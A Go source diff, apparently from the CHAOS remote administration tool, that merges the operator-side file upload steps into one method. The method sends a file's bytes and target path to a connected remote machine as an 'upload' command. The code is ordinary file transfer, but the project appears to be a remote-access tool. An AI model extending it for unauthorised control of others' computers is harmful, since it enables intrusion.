@@ -9,6 +9,7 @@ import (
 	"github.com/tiagorlampert/CHAOS/internal/util/network"
 	"github.com/tiagorlampert/CHAOS/internal/util/os"
 	c "github.com/tiagorlampert/CHAOS/pkg/color"
+	"github.com/tiagorlampert/CHAOS/pkg/util"
 	"net"
 )
 
@@ -22,75 +23,49 @@ func NewUploadUseCase(conn net.Conn) usecase.Upload {
 	}
 }
 
-func (u UploadUseCase) Validate(param []string) {
-	if len(param) != 3 {
+func (u UploadUseCase) Validate(param []string) error {
+	if len(param) != 3 || !util.Contains(param, "upload") {
 		fmt.Println(c.Yellow, "[!] Invalid parameters to upload!")
-		return
+		return fmt.Errorf("invalid parameters")
 	}
+	return nil
 }
 
-func (u UploadUseCase) Prepare(command string) {
-	err := network.Send(u.Connection, []byte(command))
-	if err != nil {
-		fmt.Println(c.Red, "[!] Error sending upload request!")
-	}
-
-	data, err := network.Read(u.Connection)
-	if err != nil {
-		log.WithField("cause", err.Error()).Error("error reading response")
-	}
-
-	var response models.Response
-	if err := json.Unmarshal(data, &response); err != nil {
-		log.Error(err)
-	}
-	if response.Error {
-		fmt.Println(c.Red, "[!] Error preparing upload!")
-	}
-}
-
-func (u UploadUseCase) SendPath(savePath string) {
-	err := network.Send(u.Connection, []byte(savePath))
-	if err != nil {
-		fmt.Println(c.Red, "[!] Error sending save path!")
-	}
-
-	data, err := network.Read(u.Connection)
-	if err != nil {
-		log.WithField("cause", err.Error()).Error("error reading response")
-	}
-
-	var response models.Response
-	if err := json.Unmarshal(data, &response); err != nil {
-		log.Error(err)
-	}
-	if response.Error {
-		fmt.Println(c.Red, "[!] Error preparing upload! ", "Directory not found")
-	}
-
-	fmt.Println(c.Green, "[*] Directory validated successfully")
-}
-
-func (u UploadUseCase) SendFile(filepath string) {
-	file, err := os.ReadFile(filepath)
+func (u UploadUseCase) File(filepathFrom string, filepathTo string) {
+	file, err := os.ReadFile(filepathFrom)
 	if err != nil {
 		log.WithField("cause", err.Error()).Error("error reading file")
+		return
 	}
 
-	if err = network.Send(u.Connection, file); err != nil {
+	upload, err := json.Marshal(models.Upload{
+		FilepathFrom: filepathFrom,
+		FilepathTo:   filepathTo,
+		Data:         file,
+	})
+	if err != nil {
+		log.Error(err)
+		return
+	}
+
+	if err = network.Send(u.Connection, models.Message{
+		Command: "upload",
+		Data:    upload,
+	}); err != nil {
 		log.WithField("cause", err.Error()).Error("error sending file")
+		return
 	}
 
-	data, err := network.Read(u.Connection)
+	response, err := network.Read(u.Connection)
 	if err != nil {
 		log.WithField("cause", err.Error()).Error("error reading response")
+		return
 	}
 
-	var response models.Response
-	if err := json.Unmarshal(data, &response); err != nil {
-		log.Error(err)
+	if response.Error.HasError {
+		fmt.Println(c.Red, "[!] Error processing file!", response.Error.Message)
+		return
 	}
-	if response.Error {
-		fmt.Println(c.Red, "[!] Error sending file! %s", response.Data)
-	}
+
+	fmt.Println(c.Green, fmt.Sprintf("[*] File successfuly uploaded!"))
 }
